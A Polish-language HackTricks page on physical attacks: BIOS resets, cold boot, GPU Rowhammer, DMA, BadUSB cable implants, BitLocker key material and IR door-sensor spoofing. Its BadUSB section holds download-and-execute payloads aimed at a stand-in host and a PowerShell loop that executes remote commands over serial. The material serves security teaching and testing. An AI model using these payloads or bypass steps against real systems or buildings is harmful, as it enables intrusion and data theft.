# Ataki fizyczne

{{#include ../banners/hacktricks-training.md}}

## Odzyskiwanie hasła BIOS i bezpieczeństwo systemu

Ustawienia starszego firmware'u komputerów PC można zresetować przez odłączenie baterii CMOS lub użycie udokumentowanej zworki clear-CMOS. Wymagany czas odłączenia zasilania zależy od płyty, a współczesne hasła lub klucze UEFI mogą być przechowywane w nieulotnej pamięci flash, kontrolerze wbudowanym lub urządzeniu zabezpieczającym, przez co przetrwają wyjęcie baterii. Przed zwarciem pinów zapoznaj się z instrukcją płyty lub serwisową; ta procedura może również unieważnić pomiary TPM i uruchomić odzyskiwanie szyfrowania dysku.

W starszych systemach x86 narzędzia takie jak **killCMOS** i **CmosPwd** mogą sprawdzać lub modyfikować ustawienia przechowywane w CMOS z poziomu środowiska rozruchowego. CmosPwd rozpoznaje formaty haseł z udokumentowanego zestawu starszych rodzin BIOS i może tworzyć kopie zapasowe, przywracać lub usuwać/zabijać stan CMOS; jego opublikowane wersje są przeznaczone dla środowisk starszego DOS/Windows, Linux, FreeBSD i NetBSD.<sup>[[18]](#references)</sup> Narzędzia te nie są uniwersalnymi narzędziami do usuwania haseł UEFI i wymagają odpowiedniego dostępu do sprzętu/firmware'u.

Niektóre firmware'y laptopów wyświetlają kod wyzwania zależny od producenta po kilku nieudanych próbach wprowadzenia hasła. Bazy danych, takie jak [bios-pw.org](https://bios-pw.org), mogą wyprowadzać starsze hasła odzyskiwania producenta dla niektórych modeli, ale wiele systemów implementuje blokadę bez możliwego do wyprowadzenia kodu wyzwania. Traktuj każde wygenerowane hasło jako zależne od modelu i unikaj wyczerpania liczników prób, których nie można zresetować.

### Bezpieczeństwo UEFI

Współczesnych systemach **UEFI** CHIPSEC może audytować zabezpieczenia zmiennych Secure Boot. Zacznij od przedstawionego poniżej testu niemodyfikującego; opcjonalny tryb `-a modify` celowo próbuje uszkodzić zmienne i powinien być używany wyłącznie w systemie laboratoryjnym, który można odzyskać. Sam CHIPSEC ostrzega, że jego uprzywilejowany sterownik i niskopoziomowy dostęp do sprzętu nie są odpowiednie dla endpointów produkcyjnych.<sup>[[11]](#references)</sup>
```bash
chipsec_main -m common.secureboot.variables
# Destructive validation on a recoverable test system only:
chipsec_main -m common.secureboot.variables -a modify
```
---

## Analiza RAM i ataki Cold Boot

Pamięć DRAM nie traci natychmiast każdego bitu po zatrzymaniu odświeżania. Szybkość zaniku danych znacznie różni się w zależności od technologii modułu i temperatury; chłodzenie może zachować użyteczne dane znacznie dłużej niż niechłodzony cykl zasilania. Atak cold-boot szybko uruchamia ponownie system w niewielkim środowisku do akwizycji danych lub przenosi schłodzony moduł, przechwytuje surową zawartość pamięci i rekonstruuje klucze kryptograficzne mimo zaniku bitów. Narzędzie do kopiowania dysków nie jest automatycznie imagerem pamięci fizycznej, a Volatility analizuje przechwycony obraz zamiast go pozyskiwać; należy używać odpowiedniego dla danej platformy, zweryfikowanego narzędzia do akwizycji danych.<sup>[[12]](#references)</sup>

---

## GPU Rowhammer przeciwko tablicom stron

Współczesne ataki GPU Rowhammer stają się znacznie bardziej użyteczne, gdy ich celem są **metadane pamięci wirtualnej GPU**, a nie zwykłe bufory. Najnowsze badania dotyczące **układów GDDR6 NVIDIA Ampere** pokazują, że atakujący uruchamiający nieuprzywilejowany kod CUDA może tworzyć specyficzne dla GPU wzorce hammeringu, używać **memory massaging** do umieszczania struktur stronicowania w podatnych wierszach, a następnie odwracać bity w **last-level page table** lub pośrednim **page directory**. Po uszkodzeniu pojedynczego wpisu translacji atakujący może uzyskać **arbitrary GPU memory read/write**, a następnie przejść do kompromitacji hosta.<sup>[[1]](#references)[[2]](#references)</sup>

### Wzorzec eksploatacji

1. **Profile hammerable rows** w GDDR6 i twórz świadome odświeżania / niejednorodne wzorce hammeringu, które omijają zabezpieczenia w DRAM.
2. **Massage GPU allocations**, aby sterownik umieszczał struktury translacji stron w podatnych lokalizacjach fizycznych, zamiast przechowywać je w domyślnej chronionej puli. W praktyce może to oznaczać wyczerpanie obszaru page tables w pamięci niskiej oraz rozprowadzenie dużych, rzadkich mapowań UVM z kontrolowanymi odstępami.
3. **Flip translation metadata**, takie jak **PFN** lub bity związane z aperture, wewnątrz wpisu page table / page directory, aby kontrolowana przez atakującego strona wirtualna wskazywała na strony page tables, dowolną pamięć GPU lub widoczne dla hosta mapowania systemowe.
4. Ponownie użyj sfałszowanego mapowania do przepisania dodatkowych wpisów translacji i uzyskaj **arbitrary GPU memory read/write** w różnych kontekstach GPU.

### Przejście do hosta i zabezpieczenia

- Przy **IOMMU disabled** sfałszowane mapowania system-aperture mogą udostępnić GPU dowolną **host physical memory**, przekształcając prymityw GPU w pełną kompromitację hosta.<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>
- **GDDRHammer** atakuje wpisy last-level page table, natomiast **GeForge** pokazuje, że uszkodzenie poziomu page directory może być łatwiejsze, ponieważ pojedynczy bit flip może przekierować większe poddrzewo translacji. Nie należy traktować tylko jednej warstwy stronicowania jako krytycznej dla bezpieczeństwa.<sup>[[1]](#references)[[2]](#references)</sup>
- **IOMMU** nadal ma znaczenie, ponieważ blokuje bezpośrednią ścieżkę do dowolnej pamięci hosta wykorzystywaną przez GDDRHammer/GeForge, ale **nie jest kompletnym zabezpieczeniem**. **GPUBreach** pokazuje drugi etap ataku, w którym atakujący uszkadza zapisywalne przez GPU bufory CPU należące do sterownika, a następnie wywołuje błędy bezpieczeństwa pamięci w sterowniku NVIDIA, aby uzyskać prymityw zapisu do kernela i **root shell**, nawet przy włączonym IOMMU.<sup>[[3]](#references)</sup>
- **System-level ECC** jest praktycznym krokiem hardeningu na obsługiwanych GPU klasy workstation/server. Konsumenckie GPU bez ECC udostępniają słabszą powierzchnię obrony.<sup>[[4]](#references)</sup>
- Ataki te nie są czysto teoretyczne: **GeForge** odnotował **1,171** bit flips na RTX 3060 oraz **202** na RTX A6000, co wystarczyło do zbudowania działającego łańcucha eskalacji uprawnień hosta.<sup>[[2]](#references)[[9]](#references)</sup>

---

## Ataki Direct Memory Access (DMA)

**Inception** demonstruje **pozyskiwanie i modyfikowanie pamięci za pomocą DMA** przez interfejsy takie jak FireWire i wczesne konfiguracje Thunderbolt, w tym historyczne sygnatury omijania logowania. Nie jest to po prostu rozwiązanie „nieskuteczne przeciwko Windows 10”: możliwość eksploatacji zależy od interfejsu, builda systemu, zasad IOMMU, stanu blokady oraz tego, czy Windows Kernel DMA Protection jest obsługiwane i włączone. Windows 10 w wersji 1803 i nowszych wprowadził Kernel DMA Protection na kompatybilnych platformach, znacząco zmieniając powierzchnię ataku.<sup>[[13]](#references)[[14]](#references)</sup>

---

## Live CD/USB do uzyskania dostępu do systemu

Na niezaszyfrowanym lub już odblokowanym woluminie Windows środowisko offline może zastąpić pliki binarne ułatwień dostępu, takie jak **sethc.exe** lub **Utilman.exe**, plikiem **cmd.exe**, uzyskując w ten sposób wiersz poleceń SYSTEM po uruchomieniu odpowiedniego skrótu na ekranie logowania. Narzędzia takie jak **chntpw** mogą edytować dane lokalnych kont w SAM. Metody te nie omijają zablokowanego woluminu BitLocker i mogą uszkodzić dane uwierzytelniające chronione przez DPAPI/EFS; należy zachować kopie forensic oraz backupy.

**Kon-Boot** to komercyjne narzędzie do omijania uwierzytelniania podczas bootowania dla obsługiwanych konfiguracji Windows/macOS. Kompatybilność zależy od systemu operacyjnego, trybu firmware, Secure Boot i konfiguracji szyfrowania dysku; narzędzie nie odszyfrowuje woluminu zablokowanego przez BitLocker.<sup>[[10]](#references)</sup>

---

## Obsługa funkcji bezpieczeństwa Windows

### Skróty bootowania i odzyskiwania

- **Delete/Supr**, F2, F10 lub inny klawisz producenta może otworzyć ustawienia firmware.
- **F8** uruchamia starsze zaawansowane opcje bootowania Windows tylko w konfiguracjach, w których ta ścieżka pozostaje włączona; sposób wejścia do bieżącego środowiska odzyskiwania jest różny.
- Przytrzymanie klawisza **Shift** może wyłączyć automatyczne logowanie Windows w niektórych konfiguracjach, chociaż ustawienia zasad/rejestru mogą wyłączyć to zachowanie.<sup>[[17]](#references)</sup>

### Urządzenia BAD USB

Urządzenia takie jak **USB Rubber Ducky** i płytki Teensy mogą zgłaszać się jako zaufane klawiatury HID i wstrzykiwać zdefiniowane wcześniej naciśnięcia klawiszy. Payload początkowo ma uprawnienia i dostęp do pulpitu zalogowanej sesji; monity UAC, blokada ekranu, układ klawiatury, synchronizacja czasowa i zasady USB endpointu nadal ograniczają jego działanie.<sup>[[15]](#references)</sup>

### Volume Shadow Copy

Uprawnienia administratora lub backupu mogą umożliwić utworzenie shadow copy albo zapisanie hives rejestru, dzięki czemu można pozyskać zablokowane pliki, takie jak **SAM** i **SYSTEM**. Jest to technika gromadzenia danych po kompromitacji, a nie obejście eskalacji uprawnień; zdarzenia należy korelować z użyciem `diskshadow`/VSS oraz eksportem hives rejestru.

## Techniki implantów BadUSB / HID

### Implanty kablowe zarządzane przez Wi-Fi

- Implanty oparte na ESP32-S3, takie jak **Evil Crow Cable Wind**, ukrywają się w kablach USB-A→USB-C lub USB-C↔USB-C, zgłaszają się wyłącznie jako klawiatura USB i udostępniają swój stos C2 przez Wi-Fi. Operator musi jedynie zasilić kabel z hosta ofiary, utworzyć hotspot o nazwie `Evil Crow Cable Wind` z hasłem `123456789` i przejść do [http://cable-wind.local/](http://cable-wind.local/) (lub jego adresu DHCP), aby uzyskać dostęp do wbudowanego interfejsu HTTP.<sup>[[8]](#references)</sup>
- Interfejs przeglądarkowy udostępnia karty *Payload Editor*, *Upload Payload*, *List Payloads*, *AutoExec*, *Remote Shell* i *Config*. Zapisane payloads są oznaczane według systemu operacyjnego, układy klawiatury są przełączane w locie, a ciągi VID/PID można zmieniać tak, aby naśladowały znane urządzenia peryferyjne.
- Ponieważ C2 znajduje się wewnątrz kabla, telefon może przygotowywać payloads, uruchamiać ich wykonanie i zarządzać danymi uwierzytelniającymi Wi-Fi bez korzystania z sieci organizacji — jest to przydatne podczas krótkotrwałych fizycznych intruzji.

### Payloads AutoExec rozpoznające system operacyjny

- Reguły AutoExec wiążą jeden lub więcej payloads z natychmiastowym uruchomieniem po enumeracji USB. Implant wykonuje uproszczone fingerprinting systemu operacyjnego i wybiera pasujący skrypt.
- Przykładowy workflow:
- *Windows:* `GUI r` → `powershell.exe` → `STRING powershell -nop -w hidden -c "iwr http://10.0.0.1/drop.ps1|iex"` → `ENTER`.
- *macOS/Linux:* `COMMAND SPACE` (Spotlight) lub `CTRL ALT T` (terminal) → `STRING curl -fsSL http://10.0.0.1/init.sh | bash` → `ENTER`.
- Ponieważ wykonanie odbywa się bez nadzoru, sama zamiana kabla do ładowania może zapewnić początkowy dostęp typu „plug-and-pwn” w kontekście zalogowanego użytkownika.

### Zdalny shell przez Wi-Fi TCP uruchamiany za pomocą HID

1. **Keystroke bootstrap:** zapisany payload otwiera konsolę i wkleja pętlę wykonującą wszystko, co nadejdzie na nowym urządzeniu USB serial. Minimalny wariant dla Windows to:
```powershell
$port=New-Object System.IO.Ports.SerialPort 'COM6',115200,'None',8,'One'
$port.Open(); while($true){$cmd=$port.ReadLine(); if($cmd){Invoke-Expression $cmd}}
```
2. **Cable bridge:** Implant utrzymuje otwarty kanał USB CDC, podczas gdy jego ESP32-S3 uruchamia klienta TCP (skrypt Python, Android APK lub aplikację wykonywalną na komputerze) łączącego się zwrotnie z operatorem. Wszystkie bajty wpisane w sesji TCP są przekazywane do powyższej pętli szeregowej, co zapewnia zdalne wykonywanie poleceń nawet na hostach odizolowanych od sieci. Dane wyjściowe są ograniczone, dlatego operatorzy zazwyczaj uruchamiają polecenia bez podglądu wyników (tworzenie kont, przygotowywanie dodatkowych narzędzi itd.).

### Powierzchnia aktualizacji HTTP OTA

- Udokumentowany interfejs Evil Crow Cable Wind udostępnia nieuwierzytelniony endpoint aktualizacji firmware'u pod adresem `/update`:<sup>[[8]](#references)</sup>
```bash
curl -F "file=@firmware.ino.bin" http://cable-wind.local/update
```
- Operatorzy terenowi mogą wymieniać funkcje w locie (np. wgrywać firmware flash USB Army Knife) w trakcie operacji, bez otwierania kabla, dzięki czemu implant może przełączać się na nowe możliwości, pozostając podłączonym do hosta docelowego.

## Omijanie szyfrowania BitLocker

Autoryzowane pozyskanie danych śledczych z działającego lub niedawno uruchomionego systemu może zawierać główny klucz woluminu BitLocker albo powiązany materiał kluczowy, gdy wolumin jest odblokowany. Komercyjne narzędzia, takie jak Elcomsoft Forensic Disk Decryptor i Passware Kit Forensic, mogą przeszukiwać obsługiwane obrazy pamięci, pliki hibernacji lub zrzuty awaryjne, ale powodzenie nie jest gwarantowane. Nowoczesny Windows szyfruje również zrzuty awaryjne, gdy BitLocker jest włączony, a zapisane 48-cyfrowe hasło odzyskiwania jest innym artefaktem niż klucz woluminu znajdujący się w pamięci.<sup>[[12]](#references)[[16]](#references)</sup>

---

## Inżynieria społeczna w celu dodania klucza odzyskiwania

Atakujący, który przekona administratora do uruchomienia poleceń zarządzania BitLocker, może dodać hasło odzyskiwania, klucz zewnętrzny lub inny protector, a następnie go przechwycić. Hasło odzyskiwania nie może być dowolnym ciągiem zer: numeryczne hasła odzyskiwania BitLocker mają zweryfikowany format 48 cyfr. Odpowiednia składnia autoryzowanej administracji to `manage-bde -protectors -add C: -recoverypassword`; wynikowe protectors można wyświetlić za pomocą `manage-bde -protectors -get C:`. Należy monitorować dodawanie protectorów i upewnić się, że nowy materiał odzyskiwania jest escrowowany wyłącznie w zatwierdzonych lokalizacjach.<sup>[[16]](#references)</sup>

---

## Wykorzystanie przełączników otwarcia obudowy / konserwacyjnych do przywrócenia BIOS-u do ustawień fabrycznych

Wiele nowoczesnych laptopów i komputerów stacjonarnych w obudowach small-form-factor zawiera **przełącznik otwarcia obudowy**, monitorowany przez Embedded Controller (EC) oraz firmware BIOS/UEFI. Chociaż podstawowym celem przełącznika jest wygenerowanie alertu po otwarciu urządzenia, producenci czasami implementują **nieudokumentowany skrót odzyskiwania**, uruchamiany po przełączeniu go w określony sposób.<sup>[[5]](#references)[[6]](#references)</sup>

### Jak działa atak

1. Przełącznik jest podłączony do **przerwania GPIO** w EC.
2. Firmware działający w EC śledzi **czas i liczbę naciśnięć**.
3. Po rozpoznaniu zakodowanego wzorca EC wywołuje procedurę *mainboard-reset*, która **usuwa zawartość systemu NVRAM/CMOS**.
4. Przy następnym uruchomieniu modele, których dotyczy problem, wczytują zresetowany stan firmware. W zależności od producenta i rewizji usunięty stan może obejmować hasło supervisora, niestandardowe ustawienia uruchamiania lub zarejestrowane klucze Secure Boot; stan TPM i skutki dla szyfrowania dysku należy ocenić osobno.

> Reset firmware może przywrócić opcje uruchamiania z nośników zewnętrznych, ale **nie odszyfrowuje pamięci masowej**. BitLocker lub inny system pełnego szyfrowania dysku może przejść w tryb odzyskiwania po zmianach TPM/firmware i nadal chronić wewnętrzny dysk bez klucza odzyskiwania.<sup>[[16]](#references)</sup>

### Przykład z rzeczywistego świata – laptop Framework 13

Skrót odzyskiwania dla Framework 13 (11./12./13. generacji) to:
```text
Press intrusion switch  →  hold 2 s
Release                 →  wait 2 s
(repeat the press/release cycle 10× while the machine is powered)
```
Po dziesiątym cyklu układ EC ustawia flagę, która nakazuje BIOS-owi wyczyszczenie pamięci NVRAM przy następnym ponownym uruchomieniu. Cała procedura trwa około 40 s i wymaga **niczego poza śrubokrętem**.<sup>[[5]](#references)</sup>

### Ogólna procedura wykorzystania podatności

1. Włącz urządzenie albo uśpij je i wybudź, aby układ EC działał.
2. Zdejmij dolną pokrywę, aby uzyskać dostęp do przełącznika wykrywania ingerencji/konserwacyjnego.
3. Odtwórz charakterystyczny dla danego producenta wzorzec przełączania (sprawdź dokumentację, fora lub przeprowadź reverse-engineering firmware'u EC).
4. Złóż urządzenie ponownie i uruchom je ponownie, a następnie sprawdź, które ustawienia firmware'u i dane uwierzytelniające faktycznie się zmieniły.
5. Jeśli masz odpowiednie uprawnienia i dostępne jest uruchamianie z nośników zewnętrznych, uruchom kontrolowany obraz live. Gdy wewnętrzny wolumin zostanie prawidłowo odblokowany (lub nigdy nie był szyfrowany), środowisko live może pozyskać dane uwierzytelniające i dane albo przeprowadzić inspekcję EFI System Partition. Modyfikowanie tej partycji w celu zainstalowania implantu EFI jest trwałe i wysoce inwazyjne, a ponadto nadal ograniczają je Secure Boot, measured boot, ochrona firmware'u przed zapisem i monitoring endpointów. Zaszyfrowana pamięć masowa pozostaje niedostępna bez klucza lub materiału odzyskiwania.

### Wykrywanie i środki zaradcze

* Rejestruj zdarzenia ingerencji w obudowę w konsoli zarządzania systemem operacyjnym i koreluj je z nieoczekiwanymi resetami BIOS-u.
* Stosuj **plomby zabezpieczające przed naruszeniem** na śrubach i pokrywach, aby wykrywać otwieranie.
* Przechowuj urządzenia w **fizycznie kontrolowanych obszarach**; zakładaj, że dostęp fizyczny oznacza pełne przejęcie.
* Jeśli jest dostępna, wyłącz funkcję „resetu przełącznikiem konserwacyjnym” producenta albo wymagaj dodatkowej autoryzacji kryptograficznej do resetowania NVRAM.

---

## Covert IR Injection Against No-Touch Exit Sensors

### Charakterystyka czujnika
- Dostępne na rynku czujniki „wave-to-exit” łączą emiter LED bliskiej podczerwieni z modułem odbiornika podobnym do odbiornika pilota telewizyjnego, który zgłasza stan logiczny wysoki dopiero po wykryciu wielu impulsów (~4–10) właściwej częstotliwości nośnej (≈30 kHz).<sup>[[7]](#references)</sup>
- Plastikowa osłona uniemożliwia bezpośrednie wzajemne widzenie emitera i odbiornika, dlatego kontroler zakłada, że każda zweryfikowana fala nośna pochodzi z pobliskiego odbicia, i steruje przekaźnikiem otwierającym elektrozaczep.
- Gdy kontroler uzna, że cel jest obecny, często zmienia obwiednię modulacji wychodzącej, ale odbiornik nadal akceptuje każdy impuls pasujący do odfiltrowanej częstotliwości nośnej.

### Przebieg ataku
1. **Przechwycenie profilu emisji** – podłącz analizator stanów logicznych do pinów kontrolera, aby zarejestrować zarówno przebiegi przed wykryciem, jak i po wykryciu, które sterują wewnętrzną diodą LED IR.
2. **Odtworzenie wyłącznie przebiegu „po wykryciu”** – odłącz lub zignoruj fabryczny emiter i steruj zewnętrzną diodą LED IR za pomocą wzorca wyzwalania już od początku. Ponieważ odbiornik interesuje się wyłącznie liczbą impulsów i częstotliwością, uznaje sfałszowaną falę nośną za prawdziwe odbicie i aktywuje linię przekaźnika.
3. **Sterowanie transmisją** – transmituj falę nośną w dostrojonych seriach (np. przez dziesiątki milisekund włączona i przez podobny czas wyłączona), aby dostarczyć minimalną liczbę impulsów bez nasycania układu AGC odbiornika ani jego logiki obsługi zakłóceń. Ciągła emisja szybko zmniejsza czułość czujnika i uniemożliwia zadziałanie przekaźnika.

### Iniekcja odbiciowa dalekiego zasięgu
- Zastąpienie laboratoryjnej diody LED diodą IR dużej mocy, sterownikiem MOSFET i optyką skupiającą umożliwia niezawodne wyzwalanie z odległości około 6 m.
- Atakujący nie potrzebuje bezpośredniej widoczności apertury odbiornika; skierowanie wiązki na wewnętrzne ściany, regały lub framugi drzwi widoczne przez szkło pozwala odbitej energii wejść w pole widzenia o kącie około 30° i naśladować machnięcie dłonią z bliska.
- Ponieważ odbiorniki oczekują wyłącznie słabych odbić, znacznie silniejsza wiązka zewnętrzna może odbijać się od wielu powierzchni, a mimo to pozostawać powyżej progu wykrywania.

### Uzbrojona latarka do ataku
- Umieszczenie sterownika wewnątrz komercyjnej latarki ukrywa narzędzie na widoku. Wymień widoczną diodę LED na diodę LED IR dużej mocy, dopasowaną do pasma odbiornika, dodaj ATtiny412 (lub podobny układ) do generowania serii impulsów ≈30 kHz i użyj MOSFET-a do odprowadzania prądu diody LED.
- Teleskopowa soczewka zmiennoogniskowa zawęża wiązkę, zwiększając zasięg i precyzję, a silnik wibracyjny sterowany przez MCU zapewnia haptyczne potwierdzenie aktywności modulacji bez emitowania światła widzialnego.
- Przełączanie między kilkoma zapisanymi wzorcami modulacji (z nieznacznie różnymi częstotliwościami nośnymi i obwiedniami) zwiększa zgodność z różnymi rodzinami czujników sprzedawanymi pod różnymi markami, umożliwiając operatorowi omiatanie powierzchni odbijających, aż przekaźnik słyszalnie kliknie i drzwi się otworzą.

---

## References

- [1] [GDDRHammer: Silne zakłócanie wierszy DRAM — ataki Rowhammer między komponentami z użyciem współczesnych GPU](https://gddr.fail/files/gddrhammer.pdf)
- [2] [GeForge: Silne zakłócanie pamięci GDDR w celu fałszowania tablic stron GPU dla zabawy i zysku](https://stefan1wan.github.io/files/GeForge.pdf)
- [3] [GPUBreach: Ataki eskalacji uprawnień na GPU z użyciem Rowhammer](https://gururaj-s.github.io/assets/pdf/SP26_GPUBreach.pdf)
- [4] [NVIDIA - komunikat bezpieczeństwa: Rowhammer - lipiec 2025](https://nvidia.custhelp.com/app/answers/detail/a_id/5671/~/security-notice%3A-rowhammer---july-2025)
- [5] [Pentest Partners – „Framework 13. Naciśnij tutaj, aby przejąć kontrolę”](https://www.pentestpartners.com/security-blog/framework-13-press-here-to-pwn/)
- [6] [FrameWiki – przewodnik resetowania płyty głównej](https://framewiki.net/guides/mainboard-reset)
- [7] [SensePost – „Nieee, tylko nie dotykaj! – omijanie czujników wyjścia IR bez dotyku za pomocą ukrytej latarki IR”](https://sensepost.com/blog/2025/noooooooooo-touch/)
- [8] [Mobile-Hacker – „Podłącz, uruchom, przejmij: hacking za pomocą Evil Crow Cable Wind”](https://www.mobile-hacker.com/2025/12/01/plug-play-pwn-hacking-with-evil-crow-cable-wind/)
- [9] [Bruce Schneier - atak Rowhammer na układy NVIDIA](https://www.schneier.com/blog/archives/2026/05/rowhammer-attack-against-nvidia-chips.html)
- [10] [Oficjalna dokumentacja Kon-Boot i informacje o zgodności](https://kon-boot.com/)
- [11] [Dokumentacja CHIPSEC - ochrona zmiennych Secure Boot](https://chipsec.github.io/modules/chipsec.modules.common.secureboot.variables.html)
- [12] [Obyśmy nie zapomnieli: ataki Cold Boot na klucze szyfrujące](https://www.usenix.org/legacy/events/sec08/tech/full_papers/halderman/halderman.pdf)
- [13] [Inception - manipulowanie pamięcią fizyczną przez DMA](https://github.com/carmaa/inception)
- [14] [Microsoft Learn - ochrona Kernel DMA](https://learn.microsoft.com/en-us/windows/security/hardware-security/kernel-dma-protection-for-thunderbolt)
- [15] [Dokumentacja Hak5 USB Rubber Ducky](https://docs.hak5.org/hak5-usb-rubber-ducky/)
- [16] [Microsoft Learn - przewodnik po operacjach BitLocker](https://learn.microsoft.com/en-us/windows/security/operating-system-security/data-protection/bitlocker/operations-guide)
- [17] [Microsoft Learn - przytrzymywanie klawisza Shift i zachowanie automatycznego logowania](https://learn.microsoft.com/en-us/troubleshoot/windows-client/user-profiles-and-logon/hold-shift-key-shutting-down-not-disable-automatic-logon)
- [18] [CGSecurity - dokumentacja i pliki do pobrania CmosPwd](https://www.cgsecurity.org/wiki/CmosPwd)
{{#include ../banners/hacktricks-training.md}}
